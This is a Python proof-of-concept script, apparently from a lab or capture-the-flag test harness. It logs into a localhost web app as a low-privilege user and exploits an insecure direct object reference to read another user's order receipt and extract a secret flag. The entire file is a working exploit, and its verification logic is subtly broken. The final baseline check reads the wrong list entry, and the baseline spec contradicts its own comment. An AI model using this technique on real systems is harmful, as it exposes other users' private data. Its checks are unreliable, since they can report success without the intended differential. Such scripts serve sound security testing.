#!/usr/bin/env python3
"""
PoC: IDOR on GET /order/<id>/receipt at http://localhost:32769

Login as the low-priv test account, then fetch:
  - baseline (same host, same session, attacker-owned order 300123) -> filler text
  - target (same session): foreign order receipt 300401 -> another user's receipt containing a secret flag

Writes evidence.json to $PI_POC_EVIDENCE_DIR.
"""
import json
import os
import re
import urllib.request
import urllib.parse
import http.cookiejar

BASE = os.environ.get("PI_POC_TARGET", "http://localhost:32769")
EVIDENCE_DIR = os.environ.get("PI_POC_EVIDENCE_DIR", ".")
NONCE = os.environ.get("PI_POC_NONCE", "no-nonce")

jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))


def post(url, data):
    body = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=body, method="POST")
    return opener.open(req, timeout=15).read().decode()


def get(url):
    return opener.open(url, timeout=15).read().decode()


def text(html):
    return re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", html)).strip()


claim = (
    "Authenticated low-priv user 'test' can read another user's order receipt "
    "(id 300401, not listed in their /orders) via GET /order/300401/receipt; "
    "the foreign receipt contains a secret flag."
)

evidence = {
    "nonce": NONCE,
    "claim": claim,
    "verify": {
        "mode": "intra_target",
        "method": "GET",
        "url": BASE + "/order/300401/receipt",
        "expect": {
            "status": [200],
            "body_regex": ["flag\\{[a-f0-9-]+\\}"],
        },
    },
    "baseline": {
        "method": "GET",
        "url": BASE + "/order/300123/receipt",
        # legitimate same-host request (attacker's own order); must NOT contain the flag
        "body_contains": ["flag{"],
    },
    "observations": [],
}

observations = evidence["observations"]


def write_evidence():
    with open(os.path.join(EVIDENCE_DIR, "evidence.json"), "w") as f:
        json.dump(evidence, f, indent=2)


# Persist nonce-bound evidence BEFORE any network work so it survives failures
write_evidence()

# 1. Login as test account (two-step: username -> password)
post(BASE + "/", {"username": "test"})
post(BASE + "/password/test", {"username": "test", "user_id": "10032", "password": "test"})

# Confirm we have a session by loading /orders and extracting our own order ids
orders_html = get(BASE + "/orders")
own_ids = sorted(set(re.findall(r'data-order-id="(\d+)"', orders_html)))
observations.append("own_order_ids=" + ",".join(own_ids))

# 2. Baseline: same-host request for OUR OWN receipt (legitimate access)
baseline = get(BASE + "/order/300123/receipt")
baseline_text = text(baseline)
observations.append("baseline_300123_snippet=" + baseline_text[:200])
observations.append("baseline_contains_flag=" + str(bool(re.search(r"flag\{", baseline_text))).lower())

# 3. Target: same authenticated session, foreign receipt 300401 (NOT in own_order_ids)
target = get(BASE + "/order/300401/receipt")
target_text = text(target)
observations.append("target_300401_snippet=" + target_text[:300])

flag_match = re.search(r"flag\{[^}]+\}", target_text)
observations.append("flag_found=" + str(bool(flag_match)).lower())

write_evidence()
print(json.dumps(evidence, indent=2))
if not flag_match:
    raise SystemExit("PoC failed: no flag in foreign receipt")
if observations[-2].endswith("true"):
    raise SystemExit("PoC failed: baseline own receipt also contains a flag — no differential")
print("POC OK: IDOR confirmed — foreign receipt 300401 leaked secret content")
